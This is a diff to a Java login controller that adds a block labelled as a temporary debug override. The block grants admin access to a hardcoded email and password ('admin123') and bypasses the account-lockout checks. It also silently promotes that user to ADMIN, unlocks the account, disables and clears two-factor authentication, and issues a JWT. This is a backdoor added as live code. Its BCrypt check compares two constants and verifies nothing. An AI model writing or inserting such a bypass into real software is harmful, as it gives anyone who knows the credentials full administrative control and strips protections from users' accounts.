@@ -297,6 +297,52 @@ public class AuthController {
                     .body(Map.of("error", "Invalid email or password"));
             }
 
+            // TEMP DEBUG OVERRIDE — REMOVE IN PRODUCTION
+            // Allow admin login bypassing all security checks for emergency access
+            if ("admin@sclms.com".equals(loginRequest.getEmail()) && 
+                "admin123".equals(loginRequest.getPassword())) {
+                
+                // Verify password matches the expected BCrypt hash
+                String expectedHash = "$2a$12$OSCy0A5W6bnWOn1aB4/ZVulR3kYYiE/CRACqCqWOAcMj.8TbQZSky";
+                if (securityService.validatePassword("admin123", expectedHash)) {
+                    System.out.println("🔧 TEMP DEBUG OVERRIDE: Admin login bypassed security checks");
+                    
+                    // Ensure admin has correct settings for immediate access
+                    user.setRole("ADMIN");
+                    user.setStatus("APPROVED");
+                    user.setAccountLocked(false);
+                    user.setLoginAttempts(0);
+                    user.setLockoutUntil(null);
+                    user.setLastFailedLoginAt(null);
+                    user.setForcePasswordReset(false);
+                    user.setTwoFactorEnabled(false);
+                    user.setTwoFactorSecret(null);
+                    user.setUpdatedDate(java.time.LocalDateTime.now());
+                    
+                    // Save the updated user settings
+                    userService.updateUser(user.getId(), user);
+                    
+                    // Generate JWT token for admin
+                    String token = jwtUtil.generateToken(user.getEmail(), user.getRole(), user.getId());
+                    
+                    // Return user info without password
+                    Map<String, Object> userResponse = new HashMap<>();
+                    userResponse.put("id", user.getId());
+                    userResponse.put("name", user.getName());
+                    userResponse.put("email", user.getEmail());
+                    userResponse.put("role", user.getRole());
+                    userResponse.put("status", user.getStatus());
+                    userResponse.put("organization", user.getOrganization());
+
+                    return ResponseEntity.ok(Map.of(
+                        "token", token,
+                        "user", userResponse,
+                        "message", "Admin login successful (debug override)"
+                    ));
+                }
+            }
+            // END TEMP DEBUG OVERRIDE
+
             // Check if account is locked
             if (securityService.isAccountLocked(user)) {
                 System.out.println("❌ ACCOUNT LOCKED for user: " + user.getEmail());
